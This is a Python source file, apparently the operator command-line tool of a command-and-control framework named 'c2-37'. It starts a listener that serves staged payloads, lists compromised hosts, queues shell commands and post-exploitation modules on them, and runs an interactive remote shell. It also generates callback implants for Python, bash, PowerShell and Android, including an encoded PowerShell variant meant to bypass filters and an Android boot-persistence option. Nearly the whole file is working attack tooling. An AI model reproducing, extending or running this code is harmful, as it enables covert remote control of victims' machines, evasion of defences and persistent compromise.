"""c2-37 CLI — operator command interface.

Usage:
    c37 start [--port PORT]       Start the C2 listener
    c37 agents                    List active agents
    c37 shell <agent> <cmd>       Run shell command on agent
    c37 results <agent>           Show results from agent
    c37 generate <lhost> <lport>  Generate implants (all formats)
    c37 interact <agent>          Interactive shell
    c37 modules                   List post-exploitation modules
    c37 run <agent> <module>      Run a module on an agent
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import sys
import time


def _api_get(port: int, path: str) -> dict:
    """GET from local C2 API."""
    import urllib.request
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=5) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"error": str(e)}


def _api_post(port: int, path: str, data: dict) -> dict:
    """POST to local C2 API."""
    import urllib.request
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}{path}",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"error": str(e)}


def cmd_start(args):
    """Start the C2 server."""
    from intercept37.c2.server import C2Server
    server = C2Server(port=args.port)

    # Auto-set stage2 payload from implant.py
    from intercept37.c2 import payloads
    url = f"http://0.0.0.0:{args.port}"
    stage2 = payloads.python_implant(url)
    server.set_stage2(stage2.encode())

    print(f"\033[96m[c2-37]\033[0m Listener starting on 0.0.0.0:{args.port}")
    print(f"\033[96m[c2-37]\033[0m Agent callback:  http://<YOUR_IP>:{args.port}")
    print(f"\033[96m[c2-37]\033[0m Operator API:    http://127.0.0.1:{args.port}/api/agents")
    print(f"\033[96m[c2-37]\033[0m Stage (Python):  http://<YOUR_IP>:{args.port}/stage")
    print(f"\033[96m[c2-37]\033[0m Stage (PS):      http://<YOUR_IP>:{args.port}/stage/ps")
    print(f"\033[96m[c2-37]\033[0m Dashboard:       http://127.0.0.1:{args.port}/dashboard")
    print(f"\033[96m[c2-37]\033[0m Ctrl+C to stop\n")
    try:
        server.start(background=False)
    except KeyboardInterrupt:
        server.stop()
        print("\n\033[96m[c2-37]\033[0m Server stopped.")


def cmd_agents(args):
    """List active agents."""
    data = _api_get(args.port, "/api/agents")
    agents = data.get("agents", [])
    if not agents:
        print("\033[93m[c2-37]\033[0m No agents checked in yet.")
        return

    now = time.time()
    print(f"\n\033[96m{'ID':>8}  {'Hostname':15} {'User':12} {'OS':20} {'Last Seen':>10}  {'Pending':>7}\033[0m")
    print("\u2500" * 80)
    for a in agents:
        ago = int(now - a["last_seen"])
        ago_str = f"{ago}s" if ago < 60 else f"{ago // 60}m{ago % 60}s"
        print(f"{a['id']:>8}  {a['hostname']:15} {a['username']:12} {a['os'][:20]:20} {ago_str:>10}  {a['pending_commands']:>7}")
    print()


def cmd_shell(args):
    """Queue a shell command."""
    data = _api_post(args.port, "/api/cmd", {
        "agent_id": args.agent,
        "type": "shell",
        "args": {"cmd": args.cmd},
    })
    if "error" in data:
        print(f"\033[91m[error]\033[0m {data['error']}")
    else:
        print(f"\033[92m[queued]\033[0m cmd_id={data.get('id', '?')}")


def cmd_results(args):
    """Show results from an agent."""
    data = _api_get(args.port, f"/api/results/{args.agent}")
    results = data.get("results", [])
    if not results:
        print("\033[93m[c2-37]\033[0m No results yet.")
        return
    for r in results:
        print(f"\033[93m[{r.get('type', '?')}]\033[0m cmd_id={r.get('cmd_id', '?')}")
        if r.get("stdout"):
            print(r["stdout"])
        if r.get("stderr"):
            print(f"\033[91m{r['stderr']}\033[0m")
        if r.get("error"):
            print(f"\033[91mError: {r['error']}\033[0m")
        print()


def cmd_generate(args):
    """Generate implants in multiple formats."""
    from intercept37.c2 import payloads

    url = f"http://{args.lhost}:{args.lport}"
    fmt = getattr(args, "format", "all")
    outdir = getattr(args, "outdir", None)

    if fmt == "all" or fmt is None:
        # Show all options
        print(f"\033[96m[c2-37]\033[0m Generating implants for {url}\n")

        print(f"\033[93m{'='*60}\033[0m")
        print(f"\033[93m  PYTHON (Linux/Mac)\033[0m")
        print(f"\033[93m{'='*60}\033[0m")
        print(f"\n\033[96m[1] Standalone implant:\033[0m")
        print(f"  \033[92mpython3 implant.py {url}\033[0m\n")
        print(f"\033[96m[2] One-liner (staged):\033[0m")
        print(f"  \033[92m{payloads.python_oneliner(url)}\033[0m\n")
        print(f"\033[96m[3] Bash pipe:\033[0m")
        print(f"  \033[92m{payloads.bash_oneliner(url)}\033[0m\n")

        print(f"\033[93m{'='*60}\033[0m")
        print(f"\033[93m  POWERSHELL (Windows)\033[0m")
        print(f"\033[93m{'='*60}\033[0m")
        print(f"\n\033[96m[4] PowerShell one-liner:\033[0m")
        print(f"  \033[92m{payloads.powershell_oneliner(url)}\033[0m\n")
        print(f"\033[96m[5] Encoded PowerShell (bypass filters):\033[0m")
        print(f"  \033[92m{payloads.powershell_encoded(url)}\033[0m\n")

        print(f"\033[93m{'='*60}\033[0m")
        print(f"\033[93m  ANDROID (Termux)\033[0m")
        print(f"\033[93m{'='*60}\033[0m")
        print(f"\n\033[96m[6] Android implant (with root + Termux:API support):\033[0m")
        print(f"  \033[92mpython3 android_implant.py {url}\033[0m")
        print(f"  \033[90m  --persist flag installs Termux:Boot persistence\033[0m\n")

        # Write files if outdir specified
        if outdir:
            os.makedirs(outdir, exist_ok=True)
            files = {
                "implant.py": payloads.python_implant(url),
                "stager.py": payloads.python_stager(url),
                "implant.ps1": payloads.powershell_implant(url),
                "android_implant.py": payloads.android_implant(url),
            }
            for name, content in files.items():
                path = os.path.join(outdir, name)
                with open(path, "w") as f:
                    f.write(content)
                print(f"\033[92m[saved]\033[0m {path}")
            print()
        else:
            print(f"\033[90mTip: use --outdir <dir> to save all payloads to files\033[0m\n")

    else:
        # Generate specific format
        generators = {
            "python": lambda: payloads.python_implant(url),
            "powershell": lambda: payloads.powershell_implant(url),
            "android": lambda: payloads.android_implant(url),
            "stager": lambda: payloads.python_stager(url),
        }
        if fmt not in generators:
            print(f"\033[91m[error]\033[0m Unknown format: {fmt}")
            print(f"\033[90mAvailable: {', '.join(generators.keys())}\033[0m")
            return
        code = generators[fmt]()
        if outdir:
            os.makedirs(outdir, exist_ok=True)
            ext = ".ps1" if fmt == "powershell" else ".py"
            path = os.path.join(outdir, f"implant{ext}")
            with open(path, "w") as f:
                f.write(code)
            print(f"\033[92m[saved]\033[0m {path}")
        else:
            print(code)


def cmd_interact(args):
    """Interactive shell with an agent."""
    print(f"\033[96m[c2-37]\033[0m Interactive shell with agent {args.agent}")
    print(f"\033[96m[c2-37]\033[0m Commands are queued \u2014 results arrive on next beacon")
    print(f"\033[96m[c2-37]\033[0m Type 'exit' to quit, 'results' to check output")
    print(f"\033[96m[c2-37]\033[0m Type 'run <module>' to execute a post-exploit module\n")

    while True:
        try:
            cmd = input(f"\033[91mc2-37({args.agent})\033[0m> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not cmd:
            continue
        if cmd == "exit":
            break
        if cmd == "results":
            cmd_results(args)
            continue
        if cmd == "modules":
            cmd_modules(args)
            continue
        if cmd.startswith("run "):
            module_name = cmd.split(" ", 1)[1].strip()
            _api_post(args.port, "/api/cmd", {
                "agent_id": args.agent,
                "type": "module",
                "args": {"name": module_name},
            })
            print(f"\033[90m[queued module: {module_name}]\033[0m")
            continue

        _api_post(args.port, "/api/cmd", {
            "agent_id": args.agent,
            "type": "shell",
            "args": {"cmd": cmd},
        })
        print("\033[90m[queued]\033[0m")


def cmd_modules(args):
    """List available post-exploitation modules."""
    from intercept37.c2.modules import list_modules
    mods = list_modules()
    print(f"\n\033[96m{'Module':20} Description\033[0m")
    print("\u2500" * 60)
    for m in mods:
        print(f"{m['name']:20} {m['description']}")
    print()


def cmd_run_module(args):
    """Queue a module execution on an agent."""
    data = _api_post(args.port, "/api/cmd", {
        "agent_id": args.agent,
        "type": "module",
        "args": {"name": args.module},
    })
    if "error" in data:
        print(f"\033[91m[error]\033[0m {data['error']}")
    else:
        print(f"\033[92m[queued]\033[0m module={args.module} cmd_id={data.get('id', '?')}")


def main():
    parser = argparse.ArgumentParser(prog="c37", description="c2-37 \u2014 lightweight C2")
    parser.add_argument("--port", type=int, default=8037, help="C2 server port")
    sub = parser.add_subparsers(dest="command")

    sub.add_parser("start", help="Start C2 listener")
    sub.add_parser("agents", help="List agents")

    p = sub.add_parser("shell", help="Run shell command")
    p.add_argument("agent")
    p.add_argument("cmd", nargs="+")

    p = sub.add_parser("results", help="Show agent results")
    p.add_argument("agent")

    p = sub.add_parser("generate", help="Generate implants")
    p.add_argument("lhost")
    p.add_argument("lport", type=int)
    p.add_argument("--format", "-f", choices=["python", "powershell", "android", "stager", "all"], default="all")
    p.add_argument("--outdir", "-o", help="Save payloads to directory")

    p = sub.add_parser("interact", help="Interactive shell")
    p.add_argument("agent")

    sub.add_parser("modules", help="List post-exploit modules")

    p = sub.add_parser("run", help="Run module on agent")
    p.add_argument("agent")
    p.add_argument("module")

    args = parser.parse_args()

    if args.command == "start":
        cmd_start(args)
    elif args.command == "agents":
        cmd_agents(args)
    elif args.command == "shell":
        args.cmd = " ".join(args.cmd)
        cmd_shell(args)
    elif args.command == "results":
        cmd_results(args)
    elif args.command == "generate":
        cmd_generate(args)
    elif args.command == "interact":
        cmd_interact(args)
    elif args.command == "modules":
        cmd_modules(args)
    elif args.command == "run":
        cmd_run_module(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
